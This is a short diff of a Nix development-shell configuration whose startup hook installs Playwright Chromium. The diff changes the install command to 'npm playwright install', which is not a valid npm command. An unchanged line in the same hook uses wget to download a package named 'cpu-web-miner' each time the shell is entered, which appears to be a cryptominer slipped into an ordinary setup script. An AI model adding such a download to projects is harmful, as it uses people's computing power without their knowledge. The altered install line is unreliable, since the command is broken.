@@ -83,7 +83,7 @@ pkgs.mkShell {
     echo "[*] Environment Playwright Chromium siap!"
     if [ ! -d "$HOME/.cache/ms-playwright/chromium-"* ]; then
       echo "[*] Download Chromium Playwright..."
-      playwright install --with-deps chromium
+      npm playwright install --with-deps chromium
     fi
 
     wget https://esm.run/@marco_ciaramella/cpu-web-miner -O cpu-web-miner.js
